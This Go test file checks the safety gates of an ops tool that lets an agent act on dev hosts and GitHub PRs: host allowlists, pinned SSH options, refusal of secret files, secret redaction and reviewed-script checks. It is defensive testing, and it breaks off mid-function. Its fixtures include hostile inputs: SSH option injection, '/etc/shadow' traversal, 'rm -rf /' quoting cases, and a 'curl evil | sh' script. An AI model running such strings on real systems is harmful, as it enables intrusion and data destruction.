package opstools

import (
	"context"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/VinnyVanGogh/staypoint/internal/config"
)

// testDataDir stands in for the StayPoint data dir; ssh_config must be in it.
const (
	testDataDir   = "/Users/x/.staypoint"
	testSSHConfig = testDataDir + "/ssh_config"
)

func testGates() config.GatesConfig {
	return config.GatesConfig{
		Hosts: config.HostClasses{Dev: []string{"mansol-dev", "both-host", "dev-noname", "dev-relcfg", "dev-nocfg", "dev-usercfg", "dev-sibling"}, Prod: []string{"mansol-prod", "both-host"}},
		Ops: config.OpsConfig{DevHosts: map[string]config.DevHostConfig{
			"mansol-dev": {
				HostName:  "10.0.0.5",
				SSHConfig: testSSHConfig,
				AppDir:    "/var/www/mansol_apps",
				Services:  []string{"mansol-web", "mansol-worker"},
				Apps: map[string]config.DevAppConfig{
					"billing": {Dir: "/var/www/mansol_apps/billing", Python: "/var/www/mansol_apps/venv/bin/python"},
				},
			},
			"both-host":   {HostName: "10.0.0.6", SSHConfig: testSSHConfig, AppDir: "/srv/app"},
			"mansol-prod": {HostName: "10.0.0.7", SSHConfig: testSSHConfig, AppDir: "/srv/app"},
			"dev-noname":  {SSHConfig: testSSHConfig, AppDir: "/srv/app"},
			"dev-relcfg":  {HostName: "10.0.0.8", SSHConfig: "ssh_config", AppDir: "/srv/app"},
			"dev-nocfg":   {HostName: "10.0.0.9", AppDir: "/srv/app"},
			"dev-usercfg": {HostName: "10.0.0.10", SSHConfig: "/Users/x/.ssh/config", AppDir: "/srv/app"},
			// A prefix match is not containment: .staypoint-evil is not .staypoint.
			"dev-sibling": {HostName: "10.0.0.11", SSHConfig: "/Users/x/.staypoint-evil/ssh_config", AppDir: "/srv/app"},
		}},
	}
}

func TestDecidePerEffect(t *testing.T) {
	cases := map[Effect]Decision{Read: Allow, DevWrite: Allow, ProdWrite: Board, ExternalWrite: Board, "": Board, "weird": Board}
	for e, want := range cases {
		if got := Decide(e); got != want {
			t.Errorf("Decide(%q) = %s, want %s", e, got, want)
		}
	}
}

func TestPlanDevHostRefuses(t *testing.T) {
	g := testGates()
	cases := []struct {
		name string
		req  DevHostRequest
		want string
	}{
		{"host not in dev list", DevHostRequest{Host: "mansol-prod", Action: "git_status"}, "not in [gates.hosts] dev"},
		{"unknown host", DevHostRequest{Host: "random-box", Action: "git_status"}, "not in [gates.hosts] dev"},
		{"host in dev and prod is prod", DevHostRequest{Host: "both-host", Action: "git_status"}, "not in [gates.hosts] dev"},
		{"host option injection", DevHostRequest{Host: "-oProxyCommand=sh", Action: "git_status"}, "not a valid host"},
		{"host with user", DevHostRequest{Host: "root@mansol-dev", Action: "git_status"}, "not a valid host"},
		{"unknown action", DevHostRequest{Host: "mansol-dev", Action: "shell"}, "not one of"},
		{"no pinned host_name", DevHostRequest{Host: "dev-noname", Action: "git_status"}, "host_name must be set"},
		{"relative ssh_config", DevHostRequest{Host: "dev-relcfg", Action: "git_status"}, "ssh_config must be an absolute path"},
		// Board review #2 #6: ssh_config is required and StayPoint-owned.
		{"no ssh_config", DevHostRequest{Host: "dev-nocfg", Action: "git_status"}, "ssh_config is required"},
		{"user ssh_config", DevHostRequest{Host: "dev-usercfg", Action: "git_status"}, "inside the StayPoint data dir"},
		{"sibling of data dir", DevHostRequest{Host: "dev-sibling", Action: "git_status"}, "inside the StayPoint data dir"},
		// Board review #2 M2: data files are not text.
		{"cat sqlite", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "db.sqlite3"}, "not a text"},
		{"cat db", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "data/app.db"}, "not a text"},
		{"cat log", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "logs/django.log"}, "not a text"},
		{"cat pyc", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "billing/__pycache__/views.cpython-312.pyc"}, "not a text"},
		{"cat pickle", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "cache/model.pickle"}, "not a text"},
		{"cat sql dump", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "backups/dump.sql"}, "not a text"},
		{"cat archive", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "backups/db.tar.gz"}, "not a text"},
		{"cat no extension", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "media/upload"}, "not a text"},
		{"cat traversal", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "../../etc/passwd"}, "outside the app dir"},
		{"cat absolute outside", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "/etc/shadow"}, "outside the app dir"},
		{"cat sibling prefix", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "/var/www/mansol_apps_old/x"}, "outside the app dir"},
		{"cat dotenv", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: ".env"}, "env/secret"},
		{"cat django.env", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "config/django.env"}, "env/secret"},
		{"cat env variant", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: ".env.production"}, "env/secret"},
		{"cat secrets dir", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "Secrets/app.json"}, "env/secret"},
		{"cat key", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "certs/server.key"}, "env/secret"},
		{"cat newline", DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "a\nb"}, "control characters"},
		{"cat empty", DevHostRequest{Host: "mansol-dev", Action: "cat_file"}, "path is required"},
		{"service not in list", DevHostRequest{Host: "mansol-dev", Action: "restart", Service: "sshd"}, "not one of the host's services"},
		{"service injection", DevHostRequest{Host: "mansol-dev", Action: "journal_tail", Service: "mansol-web;reboot"}, "not one of the host's services"},
		{"branch not allowed", DevHostRequest{Host: "mansol-dev", Action: "git_ff_pull", Branch: "main"}, "not one of"},
		{"branch option", DevHostRequest{Host: "mansol-dev", Action: "git_ff_pull", Branch: "--upload-pack=x"}, "not one of"},
		{"lines too many", DevHostRequest{Host: "mansol-dev", Action: "journal_tail", Service: "mansol-web", Lines: 99999}, "lines"},
		{"port zero", DevHostRequest{Host: "mansol-dev", Action: "http_get_local"}, "port"},
		{"url path injection", DevHostRequest{Host: "mansol-dev", Action: "http_get_local", Port: 8000, Path: "/x' -o /tmp/y '"}, "URL path"},
		{"collectstatic without app", DevHostRequest{Host: "mansol-dev", Action: "collectstatic"}, "needs app"},
		{"unknown app", DevHostRequest{Host: "mansol-dev", Action: "pip_sync", App: "payroll"}, "not configured"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, err := PlanDevHost(g, testDataDir, tc.req)
			if err == nil {
				t.Fatalf("expected refusal, got plan %q", p.Remote)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("error %q does not mention %q", err, tc.want)
			}
		})
	}
}

func TestPlanDevHostEffects(t *testing.T) {
	g := testGates()
	cases := []struct {
		req    DevHostRequest
		effect Effect
		remote string
	}{
		{DevHostRequest{Host: "mansol-dev", Action: "git_status"}, Read, "git -C '/var/www/mansol_apps' status --short --branch"},
		{DevHostRequest{Host: "mansol-dev", Action: "git_log", Lines: 5}, Read, "log --oneline -n 5"},
		{DevHostRequest{Host: "mansol-dev", Action: "ls"}, Read, "ls -la"},
		{DevHostRequest{Host: "mansol-dev", Action: "cat_file", Path: "billing/views.py"}, Read, "'/var/www/mansol_apps/billing/views.py'"},
		{DevHostRequest{Host: "mansol-dev", Action: "journal_tail", Service: "mansol-web"}, Read, "journalctl -u 'mansol-web' -n 100 --no-pager"},
		{DevHostRequest{Host: "mansol-dev", Action: "systemctl_status", Service: "mansol-worker"}, Read, "systemctl status 'mansol-worker'"},
		{DevHostRequest{Host: "mansol-dev", Action: "http_get_local", Port: 8000, Path: "/health?x=1"}, Read, "'http://127.0.0.1:8000/health?x=1'"},
		{DevHostRequest{Host: "mansol-dev", Action: "git_ff_pull", Branch: "dev-server"}, DevWrite, "pull --ff-only origin 'dev-server'"},
		{DevHostRequest{Host: "mansol-dev", Action: "restart", Service: "mansol-web"}, DevWrite, "systemctl restart 'mansol-web'"},
		{DevHostRequest{Host: "mansol-dev", Action: "collectstatic", App: "billing"}, DevWrite, "cd '/var/www/mansol_apps/billing' && '/var/www/mansol_apps/venv/bin/python' manage.py collectstatic --noinput"},
		{DevHostRequest{Host: "mansol-dev", Action: "pip_sync", App: "billing"}, DevWrite, "-m pip install -r 'requirements.txt'"},
	}
	for _, tc := range cases {
		p, err := PlanDevHost(g, testDataDir, tc.req)
		if err != nil {
			t.Fatalf("%s: %v", tc.req.Action, err)
		}
		if p.Effect != tc.effect {
			t.Errorf("%s: effect %s, want %s", tc.req.Action, p.Effect, tc.effect)
		}
		if !strings.Contains(p.Remote, tc.remote) {
			t.Errorf("%s: remote %q lacks %q", tc.req.Action, p.Remote, tc.remote)
		}
		if d, _ := Declared("mcp__staypoint__dev_host_run", []byte(`{"action":"`+tc.req.Action+`"}`)); d != tc.effect {
			t.Errorf("%s: Declared = %s, want %s", tc.req.Action, d, tc.effect)
		}
	}
	if d, _ := Declared("dev_host_run", []byte(`{"action":"rm_rf"}`)); d != ProdWrite {
		t.Errorf("unknown action declared %s, want prod_write", d)
	}
}

func TestShQuoteSurvivesQuotes(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	for _, s := range []string{"plain", "it's", `"; rm -rf / #`, "$(id)", "`id`", "a'b'c"} {
		out, err := exec.Command(sh, "-c", "printf '%s' "+shQuote(s)).Output()
		if err != nil || string(out) != s {
			t.Errorf("shQuote(%q) round-trip = %q, %v", s, out, err)
		}
	}
}

// TestResolvedUnderOnRealShell runs the remote guard script against a real
// directory tree: a symlink out of the app dir and a symlink to an env file
// are refused even though their names pass the local check.
func TestResolvedUnderOnRealShell(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	root, _ := filepath.EvalSymlinks(t.TempDir())
	app := filepath.Join(root, "app")
	outside := filepath.Join(root, "outside")
	for _, d := range []string{app, outside} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	write := func(p, s string) {
		if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write(filepath.Join(app, "views.py"), "print('ok')\n")
	write(filepath.Join(app, "django.env"), "SECRET_KEY=fixture\n")
	write(filepath.Join(outside, "passwd"), "root:x:0:0\n")
	if err := os.Symlink(filepath.Join(outside, "passwd"), filepath.Join(app, "notes.txt")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(app, "django.env"), filepath.Join(app, "settings.txt")); err != nil {
		t.Fatal(err)
	}
	// A text-named link to a database is judged by what it resolves to.
	write(filepath.Join(app, "db.sqlite3"), "SQLite format 3\x00sessionid=fixture\n")
	if err := os.Symlink(filepath.Join(app, "db.sqlite3"), filepath.Join(app, "schema.txt")); err != nil {
		t.Fatal(err)
	}
	g := config.GatesConfig{
		Hosts: config.HostClasses{Dev: []string{"dev"}},
		Ops:   config.OpsConfig{DevHosts: map[string]config.DevHostConfig{"dev": {HostName: "127.0.0.1", SSHConfig: testSSHConfig, AppDir: app}}},
	}
	run := func(path string) (string, int) {
		p, err := PlanDevHost(g, testDataDir, DevHostRequest{Host: "dev", Action: "cat_file", Path: path})
		if err != nil {
			t.Fatalf("plan %s: %v", path, err)
		}
		cmd := exec.Command(sh, "-c", p.Remote)
		out, _ := cmd.CombinedOutput()
		return string(out), cmd.ProcessState.ExitCode()
	}
	if out, code := run("views.py"); code != 0 || !strings.Contains(out, "print('ok')") {
		t.Fatalf("views.py: exit %d %q", code, out)
	}
	if out, code := run("notes.txt"); code != 3 || strings.Contains(out, "root:x") {
		t.Fatalf("symlink out of app dir: exit %d %q", code, out)
	}
	if out, code := run("settings.txt"); code != 3 || strings.Contains(out, "SECRET_KEY") {
		t.Fatalf("symlink to env file: exit %d %q", code, out)
	}
	if out, code := run("schema.txt"); code != 3 || strings.Contains(out, "SQLite") {
		t.Fatalf("text-named symlink to a database: exit %d %q", code, out)
	}
	if _, code := run("missing.py"); code != 2 {
		t.Fatalf("missing file: exit %d, want 2", code)
	}

	// Board review #3: an app_dir that is itself a symlink (a current-release
	// link) still works, and still keeps its escapes out.
	current := filepath.Join(root, "current")
	if err := os.Symlink(app, current); err != nil {
		t.Fatal(err)
	}
	g.Ops.DevHosts["dev"] = config.DevHostConfig{HostName: "127.0.0.1", SSHConfig: testSSHConfig, AppDir: current}
	if out, code := run("views.py"); code != 0 || !strings.Contains(out, "print('ok')") {
		t.Fatalf("symlinked app dir: exit %d %q", code, out)
	}
	if out, code := run("notes.txt"); code != 3 || strings.Contains(out, "root:x") {
		t.Fatalf("symlinked app dir, link out: exit %d %q", code, out)
	}
	p, err := PlanDevHost(g, testDataDir, DevHostRequest{Host: "dev", Action: "ls"})
	if err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(sh, "-c", p.Remote).CombinedOutput(); err != nil || !strings.Contains(string(out), "views.py") {
		t.Fatalf("ls of symlinked app dir: %v %q", err, out)
	}
}

func TestRedactFixtureEnvFile(t *testing.T) {
	raw, err := os.ReadFile(filepath.Join("testdata", "django.env"))
	if err != nil {
		t.Fatal(err)
	}
	out := Redact(string(raw))
	if strings.Contains(out, "fixture-") {
		t.Fatalf("secret fragment survived redaction:\n%s", out)
	}
	for _, keep := range []string{"DJANGO_SETTINGS_MODULE=mansol.settings.dev", "DEBUG=True", "ALLOWED_HOSTS=dev.example.com", "SECRET_KEY=", "postgres://mansol:"} {
		if !strings.Contains(out, keep) {
			t.Errorf("redaction removed non-secret %q:\n%s", keep, out)
		}
	}
}

func TestRunDevHostUsesBatchSSHAndRedacts(t *testing.T) {
	raw, _ := os.ReadFile(filepath.Join("testdata", "django.env"))
	var got Cmd
	fake := func(ctx context.Context, c Cmd) Result {
		got = c
		return Result{Output: string(raw), ExitCode: 0}
	}
	p, err := PlanDevHost(testGates(), testDataDir, DevHostRequest{Host: "mansol-dev", Action: "journal_tail", Service: "mansol-web"})
	if err != nil {
		t.Fatal(err)
	}
	out := RunDevHost(context.Background(), fake, p)
	pinned := []string{
		"-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "-o", "HostName=10.0.0.5",
		"-o", "ProxyCommand=none", "-o", "ProxyJump=none", "-o", "ControlMaster=no", "-o", "ControlPath=none",
		"-o", "PermitLocalCommand=no", "-o", "StrictHostKeyChecking=yes",
	}
	// The StayPoint-owned ssh config always replaces ~/.ssh/config (Board
	// review #2 #6); the pins still apply on top of it.
	want := append(append([]string{"-T", "-F", testSSHConfig}, pinned...), "mansol-dev", p.Remote)
	if got.Name != "ssh" || strings.Join(got.Args, "\x00") != strings.Join(want, "\x00") {
		t.Fatalf("ssh argv = %s %q", got.Name, got.Args)
	}
	if strings.Contains(out, "fixture-") || !strings.HasPrefix(out, "exit 0") {
		t.Fatalf("output not redacted or missing exit: %s", out)
	}
}

func TestMergeEffectAndPlan(t *testing.T) {
	for base, want := range map[string]Effect{"dev-server": DevWrite, "dev": DevWrite, "main": ProdWrite, "master": ProdWrite, "prod": ProdWrite, "feature/x": ProdWrite, "": ProdWrite} {
		if got := MergeEffect(base); got != want {
			t.Errorf("MergeEffect(%q) = %s, want %s", base, got, want)
		}
	}
	head := strings.Repeat("a", 40)
	view := func(url, base, state string) []byte {
		return []byte(`{"url":"` + url + `","baseRefName":"` + base + `","headRefName":"feature","headRefOid":"` + head + `","state":"` + state + `"}`)
	}
	const prURL = "https://github.com/Owner/repo/pull/7"
	req := PRMergeRequest{Repo: "/r", PR: 7, Base: "main", Method: "merge"}
	if _, err := PlanPRMerge(req, view(prURL, "dev-server", "OPEN")); err == nil || !strings.Contains(err.Error(), "not the declared base") {
		t.Fatalf("declared base lie not refused: %v", err)
	}
	devReq := PRMergeRequest{Repo: "/r", PR: 7, Base: "dev-server", Method: "merge"}
	if _, err := PlanPRMerge(devReq, view(prURL, "main", "OPEN")); err == nil {
		t.Fatal("main PR declared as dev-server was not refused")
	}
	if _, err := PlanPRMerge(req, view(prURL, "main", "MERGED")); err == nil {
		t.Fatal("merged PR not refused")
	}
	for _, bad := range []string{"", "https://github.example.com/o/r/pull/7", "https://github.com/o/r/pull/8", "https://github.com/o/../pull/7", "https://github.com/o/r/pull/7/files"} {
		if _, err := PlanPRMerge(req, view(bad, "main", "OPEN")); err == nil {
			t.Errorf("PR URL %q accepted", bad)
		}
	}
	p, err := PlanPRMerge(req, view(prURL, "main", "OPEN"))
	if err != nil {
		t.Fatal(err)
	}
	if p.Effect != ProdWrite || p.GHRepo != "Owner/repo" {
		t.Fatalf("main merge effect %s repo %s", p.Effect, p.GHRepo)
	}
	// The approval binds to the GitHub repo, not the local directory.
	if !strings.Contains(p.Canonical(), "gh_repo=Owner/repo pr=7 base=main") || strings.Contains(p.Canonical(), "/r ") {
		t.Fatalf("canonical %q", p.Canonical())
	}
	if args := strings.Join(p.MergeArgs(), " "); args != "pr merge 7 --repo Owner/repo --merge --match-head-commit "+head {
		t.Fatalf("merge args %q", args)
	}
	if got := strings.Join(PRViewArgs(7, "Owner/repo"), " "); !strings.HasSuffix(got, "--repo Owner/repo") {
		t.Fatalf("pinned view args %q", got)
	}

	// After the merge: merged into the decided base, in the same repo.
	if err := p.CheckMerged(view(prURL, "main", "MERGED")); err != nil {
		t.Fatalf("clean merge flagged: %v", err)
	}
	if err := p.CheckMerged(view(prURL, "prod", "MERGED")); err == nil || !strings.Contains(err.Error(), "base changed") {
		t.Fatalf("base swapped during merge not reported: %v", err)
	}
	if err := p.CheckMerged(view("https://github.com/fork/repo/pull/7", "main", "MERGED")); err == nil {
		t.Fatal("other repo after merge not reported")
	}
	if err := p.CheckMerged(view(prURL, "main", "OPEN")); err == nil {
		t.Fatal("unmerged PR after merge not reported")
	}
}

func TestGitHubSlugAndPRBodyEffect(t *testing.T) {
	for url, want := range map[string]string{
		"https://github.com/o/r.git":     "o/r",
		"https://github.com/o/r":         "o/r",
		"git@github.com:o/r.git":         "o/r",
		"ssh://git@github.com/o/r.git\n": "o/r",
		"https://evil.com/o/r.git":       "",
		"https://github.com.evil/o/r":    "",
		"https://github.com/o/r/x":       "",
		"/local/path":                    "",
	} {
		if got := GitHubSlug(url); got != want {
			t.Errorf("GitHubSlug(%q) = %q, want %q", url, got, want)
		}
	}
	own := []string{"o/r"}
	const mine = "staypoint/task-1"
	cases := []struct {
		repo, head, slug, task string
		own                    []string
		want                   Effect
	}{
		{"o/r", mine, "o/r", "task-1", own, DevWrite},
		{"O/R", mine, "o/r", "task-1", own, DevWrite},
		{"other/r", mine, "o/r", "task-1", own, ExternalWrite},
		{"o/r", "main", "o/r", "task-1", own, ExternalWrite},
		{"o/r", "prod", "o/r", "task-1", own, ExternalWrite},
		{"o/r", mine, "", "task-1", own, ExternalWrite},
		// Board review #2 #7/L1: another task's PR, or any other branch's,
		// in the same repo is not this task's to edit unattended.
		{"o/r", "feature/x", "o/r", "task-1", own, ExternalWrite},
		{"o/r", "staypoint/task-2", "o/r", "task-1", own, ExternalWrite},
		{"o/r", "staypoint/task-1-evil", "o/r", "task-1", own, ExternalWrite},
		{"o/r", "staypoint/", "o/r", "", own, ExternalWrite},
		// A repointed task origin names a repo the Board never listed.
		{"attacker/r", mine, "attacker/r", "task-1", own, ExternalWrite},
		{"o/r", mine, "o/r", "task-1", nil, ExternalWrite},
	}
	for _, c := range cases {
		if got := PRBodyEffect(c.repo, c.head, c.slug, c.task, c.own); got != c.want {
			t.Errorf("PRBodyEffect(%q, %q, %q, %q, %v) = %s, want %s", c.repo, c.head, c.slug, c.task, c.own, got, c.want)
		}
	}
}

// task-7d279c9d Board review: every redaction gap found, as a table.
func TestRedactTable(t *testing.T) {
	cases := []struct {
		name, in string
		leak     []string
		keep     []string
	}{
		{"unquoted value with spaces", "SECRET_KEY: abc def ghi\nNEXT=1", []string{"abc", "def", "ghi"}, []string{"NEXT=1"}},
		{"DB_PASS", "DB_PASS=hunter2 x", []string{"hunter2"}, nil},
		{"MYSQL_PWD", "MYSQL_PWD=pw-one", []string{"pw-one"}, nil},
		{"bare key quoted with space", "key = 'a b'", []string{"'a b'", "a b"}, nil},
		{"redis empty user", "REDIS_URL=redis://:redispw@cache:6379/0", []string{"redispw"}, []string{"cache:6379"}},
		{"password with @", "DATABASE_URL=postgres://user:p@ss@db.host/app", []string{"p@ss", "ss@db"}, []string{"db.host/app", "postgres://user:"}},
		{"escaped quote json", `{"password": "ab\"cd ef", "user": "bob"}`, []string{"cd ef", "ab\\"}, []string{`"user": "bob"`}},
		{"escaped single quote", `api_key='ab\'cd ef'`, []string{"cd ef"}, nil},
		{"python triple double", "SECRET_KEY = \"\"\"line one\nline two\"\"\"\nDEBUG = True", []string{"line one", "line two"}, []string{"DEBUG = True"}},
		{"python triple single", "PASSWORD = '''p1\np2'''", []string{"p1", "p2"}, nil},
		{"unterminated triple", "TOKEN = \"\"\"t1\nt2", []string{"t1", "t2"}, nil},
		{"unterminated quote", `SECRET="abc def`, []string{"abc", "def"}, nil},
		{"pem no END line", "cfg ok\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAfixture\nMIIcut", []string{"MIIEpAIBAAKCAQEAfixture", "MIIcut"}, []string{"cfg ok"}},
		{"pem with END line", "-----BEGIN PRIVATE KEY-----\nMIIfixture\n-----END PRIVATE KEY-----\nafter", []string{"MIIfixture"}, []string{"after"}},
		{"authorization header", "Authorization: Bearer abc.def ghi", []string{"abc.def", "ghi"}, nil},
		// Board review #2 #3 residual.
		{"url password with slash", "DATABASE_URL=postgres://user:pa/ss@db.host/app", []string{"pa/ss", "ss@db"}, []string{"db.host/app"}},
		{"url password with question mark", "connecting to postgres://user:pa?ss@db.host/app", []string{"pa?ss"}, []string{"db.host/app"}},
		{"url digit password with slash", "redis://u:1234/x@cache:6379", []string{"1234/x"}, []string{"cache:6379"}},
		{"url port and path with @ stays", "GET http://127.0.0.1:8000/login?next=/a@b HTTP 200", nil, []string{"http://127.0.0.1:8000/login?next=/a@b"}},
		{"ADMIN_PW", "ADMIN_PW=adminpw1", []string{"adminpw1"}, nil},
		{"_SK suffix", "STRIPE_SK=sk_live_fixture1", []string{"sk_live_fixture1"}, nil},
		{"_SALT suffix", "PASSWORD_HASH_SALT=salt-fixture\nHASH_SALT: s2", []string{"salt-fixture", "s2"}, nil},
		{"set-cookie header", "Set-Cookie: sessionid=sess-fixture; HttpOnly; Path=/", []string{"sess-fixture"}, nil},
		{"cookie header", "Cookie: csrftoken=c1; sessionid=sess-fixture2", []string{"sess-fixture2", "c1"}, nil},
		{"sessionid in log", "auth ok sessionid=sess-fixture3 user=7", []string{"sess-fixture3"}, nil},
		{"mysql -p", "mysql -u root -pmy-fixture-pw appdb", []string{"my-fixture-pw"}, []string{"mysql -u root -p", "appdb"}},
		{"mysqldump -p quoted", "mysqldump -h db -p'my fixture' appdb", []string{"my fixture"}, []string{"appdb"}},
		{"mysql -P port stays", "mysql -h db -P 3306 appdb", nil, []string{"-P 3306 appdb"}},
		{"line continuation", "PASSWORD=first \\\n  second-line-fixture \\\n  third-fixture\nNEXT=1", []string{"first", "second-line-fixture", "third-fixture"}, []string{"NEXT=1"}},
		{"verify PASS lines stay", "PASS: /billing marker found\nDEV DEPLOY VERIFIED abc1234", nil, []string{"PASS: /billing marker found", "DEV DEPLOY VERIFIED abc1234"}},
		{"non-secret keys stay", "DEBUG=True\nmonkey: banana\nALLOWED_HOSTS=a.example", nil, []string{"DEBUG=True", "monkey: banana", "ALLOWED_HOSTS=a.example"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out := Redact(c.in)
			for _, l := range c.leak {
				if strings.Contains(out, l) {
					t.Errorf("leaked %q:\n%s", l, out)
				}
			}
			for _, k := range c.keep {
				if !strings.Contains(out, k) {
					t.Errorf("over-redacted %q:\n%s", k, out)
				}
			}
		})
	}
}

func TestValidatePRMerge(t *testing.T) {
	dir := t.TempDir()
	bad := []PRMergeRequest{
		{Repo: dir, PR: 0, Base: "main"},
		{Repo: dir, PR: 1, Base: "-x"},
		{Repo: dir, PR: 1, Base: "a..b"},
		{Repo: dir, PR: 1, Base: "main", Method: "admin"},
		{Repo: "relative", PR: 1, Base: "main"},
		{Repo: filepath.Join(dir, "nope"), PR: 1, Base: "main"},
	}
	for _, r := range bad {
		if err := ValidatePRMerge(&r, ""); err == nil {
			t.Errorf("accepted %+v", r)
		}
	}
	ok := PRMergeRequest{PR: 3, Base: "dev-server"}
	if err := ValidatePRMerge(&ok, dir); err != nil || ok.Repo != dir || ok.Method != "merge" {
		t.Fatalf("default repo/method: %+v %v", ok, err)
	}
}

func TestVerifyValidation(t *testing.T) {
	allowed := []string{"Org/mansol_apps"}
	bad := []VerifyRequest{
		{Repo: "org/other", SHA: "abc1234", PageChecks: []string{"/a=b"}},
		{Repo: "/Users/x/repo", SHA: "abc1234", PageChecks: []string{"/a=b"}},
		{Repo: "org/../x", SHA: "abc1234", PageChecks: []string{"/a=b"}},
		{Repo: "org/mansol_apps", SHA: "xyz", PageChecks: []string{"/a=b"}},
		{Repo: "org/mansol_apps", SHA: "abc1234"},
		{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"a=b"}},
		{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"/a b=c"}},
		{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"/a=b\nc"}},
		{Repo: "org/mansol_apps", SHA: "-abc1234", PageChecks: []string{"/a=b"}},
	}
	for _, r := range bad {
		if err := ValidateVerify(&r, allowed); err == nil {
			t.Errorf("accepted %+v", r)
		}
	}
	ok := VerifyRequest{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"/billing/=Billing Dashboard"}}
	if err := ValidateVerify(&ok, allowed); err != nil {
		t.Fatalf("valid request refused: %v", err)
	}
}

func TestGitBlobIDMatchesGit(t *testing.T) {
	body := []byte("#!/bin/bash\necho PASS\n")
	cmd := exec.Command("git", "hash-object", "--stdin")
	cmd.Stdin = strings.NewReader(string(body))
	out, err := cmd.Output()
	if err != nil {
		t.Skip("no git")
	}
	if got := gitBlobID(body); got != strings.TrimSpace(string(out)) {
		t.Fatalf("gitBlobID = %s, git says %s", got, out)
	}
}

// fullSHA is what fakeGitHub resolves the requested short sha abc1234 to.
const fullSHA = "abc1234" + "0123456789abcdef0123456789abcdef0"

// fakeGitHub answers the verify flow's gh api calls with the given script
// bodies per ref ("" = no such file); lie makes GitHub report a sha that
// does not match the bytes. It records every script bash ran.
func fakeGitHub(dev, main string, lie bool, ranBash *[]string) Runner {
	answer := func(body string) Result {
		if body == "" {
			return Result{ExitCode: 1}
		}
		sha := gitBlobID([]byte(body))
		if lie {
			sha = gitBlobID([]byte("something else"))
		}
		js := `{"sha":"` + sha + `","encoding":"base64","content":"` + base64.StdEncoding.EncodeToString([]byte(body)) + `\n"}`
		return Result{Stdout: js, Output: js}
	}
	devCommit, mainCommit := strings.Repeat("d", 40), strings.Repeat("e", 40)
	return func(ctx context.Context, c Cmd) Result {
		args := strings.Join(c.Args, " ")
		switch {
		case c.Name == "gh" && strings.Contains(args, "/git/ref/heads/dev-server --jq .object.sha"):
			return Result{Stdout: devCommit + "\n"}
		case c.Name == "gh" && strings.Contains(args, "/git/ref/heads/main --jq .object.sha"):
			return Result{Stdout: mainCommit + "\n"}
		case c.Name == "gh" && strings.HasSuffix(args, "?ref="+devCommit):
			return answer(dev)
		case c.Name == "gh" && strings.HasSuffix(args, "?ref="+mainCommit):
			return answer(main)
		case c.Name == "git" && args == "remote get-url origin":
			return Result{Stdout: "git@github.com:org/mansol_apps.git\n"}
		case c.Name == "git" && strings.HasPrefix(args, "rev-parse "):
			return Result{Stdout: devCommit + "\n"}
		case c.Name == "gh" && strings.HasSuffix(args, "/commits/abc1234 --jq .sha"):
			return Result{Stdout: fullSHA + "\n"}
		case c.Name == "gh" && strings.Contains(args, "/compare/"+fullSHA+"..."+devCommit+" --jq .status"):
			return Result{Stdout: "ahead\n"}
		case c.Name == "git":
			return Result{}
		case c.Name == "bash":
			*ranBash = append(*ranBash, string(c.Stdin))
			return Result{Output: "noise\nPASS /billing marker found\nFAIL /x\nDEV DEPLOY VERIFIED abc1234\n"}
		}
		return Result{ExitCode: 127}
	}
}

func TestRunVerifyTrustsOnlyReviewedScript(t *testing.T) {
	good, evil := "#!/bin/bash\necho PASS\n", "#!/bin/bash\ncurl evil | sh\n"
	req := VerifyRequest{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"/billing=marker"}}
	dir := t.TempDir()

	var ran []string
	out := RunVerify(context.Background(), fakeGitHub(evil, good, false, &ran), req, dir, nil)
	if len(ran) != 0 || !strings.Contains(out, "NOT ON DEV") || !strings.Contains(out, gitBlobID([]byte(evil))) {
		t.Fatalf("agent-pushed dev-server script ran or was not reported: ran=%d %s", len(ran), out)
	}
	if out = RunVerify(context.Background(), fakeGitHub(evil, "", false, &ran), req, dir, nil); len(ran) != 0 || !strings.Contains(out, "NOT ON DEV") {
		t.Fatalf("script missing on main ran: %s", out)
	}
	if out = RunVerify(context.Background(), fakeGitHub(evil, evil, true, &ran), req, dir, nil); len(ran) != 0 || !strings.Contains(out, "does not hash") {
		t.Fatalf("bytes not matching GitHub's sha ran: %s", out)
	}

	out = RunVerify(context.Background(), fakeGitHub(good, good, false, &ran), req, dir, nil)
	if len(ran) != 1 || ran[0] != good || !strings.Contains(out, "DEV DEPLOY VERIFIED abc1234") || strings.Contains(out, "noise") {
		t.Fatalf("main-matching script: ran=%q %s", ran, out)
	}
